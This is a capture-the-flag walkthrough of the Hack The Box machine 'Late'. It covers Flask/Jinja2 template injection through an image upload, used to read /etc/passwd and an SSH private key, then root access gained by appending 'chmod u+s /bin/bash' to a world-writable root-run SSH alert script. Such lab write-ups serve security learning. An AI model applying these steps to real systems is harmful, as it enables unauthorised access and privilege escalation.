<h1>Summary</h1>

Late is an easy difficulty box with practically two parts. The first was to identify the image upload function on the http site was vulnerable to SSTI and crafting an image to serve as the payload. The second was to find an SSH login alert bash script that was run as root and writable by everyone. 

<h1>Enumeration</h1>

This box I decided to try <code>rustscan</code> to scan for open ports and services. It's effectively a wrapper around <code>nmap</code> which allows for additional functionality and faster scanning, but in my case I use it for the latter of those reasons. 

<h2>rustscan</h2>

```bash
rustscan 10.10.11.156 | tee results.scan
```

```

![late.htb FAQ](/img/late/late_htb_FAQ.png)

Taking a look around we can quickly find in the FAQ a link to the online photo editor. That specific link directs to <code>images.late.htb</code>. Now I can add the domain and subdomain to my <code>/etc/hosts</code> file:

```
10.10.11.156 late.htb images.late.htb
```

![images.late.htb](/img/late/late_htb_images.png)

After adding that subdomain to my hosts file, we are presented with a page to turn an uploaded image into text. There is one major indicator of our next step and it lies within the header at the top: Flask. 

<h1>Foothold</h1>

Before we get ahead of ourselves we could test this pages functionality. I throw a cat picture at the text converter as a sanity check:

![cat upload test](/img/late/late_htb_test_upload.png)

That is exactly as expected, now let's create a simple image with text to determine if this is vulnerable to SSTI and if it properly handles regular text.

![SSTI test response](/img/late/late_htb_test_payload_response.png)

Great, my suspicions were confirmed and now we can move onto the next part. 

<h2>Flask and SSTI</h2>

Now in short, Flask is a python based web framework which is notoriously vulnerable to one type of attack: Server Side Template Injection. The framework integrates the use of templates, which allow for importing data from various pages and parts of a site. For example this site itself uses layout pages that contain \{\{ content \}\} to import the referencing page's information. Another functionality of those templates is the ability to run code and commands with the language natively used within the framework. 

For the test payload I used \{\{7*7\}\} which if the application is SSTI vulnerable will calculate the result, which is the 49 we received in the response. 

There is one slight problem however when it comes to SSTI on Flask, and that is navigating python objects and inheritance trees. In order to run commands or code through templates we need to crawl through the Python environment to find classes useful to us. In some cases it can be as simple as throwing a pre-generated cheatsheet payload template at Flask, and in others is can look something like \{\{‘’.\_\_class\_\_.\_\_mro\_\_[1].\_\_subclasses\_\_()[284:]\}\} and the only way to find out is by enumerating the classes used in the application. 

Get it? Good, because all of that paragraph above is worthless since the [cheatsheet templates below](https://github.com/Jieyab89/Jinja2-python-or-flask-SSTI-vulnerability-payload-) I tested against it worked ... 

![SSTI /etc/passwd read](/img/late/carbon_(61).png)
![SSTI ssh key read](/img/late/ssh_payload.png)

When you give the upload an SSTI payload it returns the results of the payload. In the second payload's case that would be the ssh key for the account running the site. A soft blessing ends up working in my favor, as the test payload to read <code>/etc/passwd</code> shows me the potential names for accounts to ssh into, the winner of those being svc_acc.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Late]
└──╼ $ssh svc_acc@10.10.11.156 -i id_rsa
svc_acc@late:~$ id
uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
```

<h1>Root</h1>

Since this is an easy box it's safe to assume linpeas will likely churn out my next step, and would you look at that a bash script in <code>/usr/local/sbin</code>

![linpeas scan](/img/late/late_htb_linpeas.png)

```
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

The script is sending an email to the presumptive root email for every SSH login. Now I have two options, I can scour the machine to determine who is running this script, or I can append <code>whoami</code> to the script and log back in.

```bash
svc_acc@late:~$ echo 'whoami | tee /tmp/user' >> /usr/local/sbin/ssh-alert.sh
svc_acc@late:~$ exit
logout
Connection to 10.10.11.156 closed.
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Late]
└──╼ $ssh svc_acc@10.10.11.156 -i id_rsa 
svc_acc@late:~$ cat /tmp/user
root
```

Well if root is running this script our priv esc is as simple as modifying bin bash to be an SUID, making it run as the owner root. 

```bash
svc_acc@late:~$ echo 'chmod u+s /bin/bash' >> /usr/local/sbin/ssh-alert.sh 
svc_acc@late:~$ exit
logout
Connection to 10.10.11.156 closed.
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Late]
└──╼ $ssh svc_acc@10.10.11.156 -i id_rsa 
-bash-4.4$ bash -p
bash-4.4# whoami
root
```

And with that I can read the root.txt flag in the root directory and pwn the box.
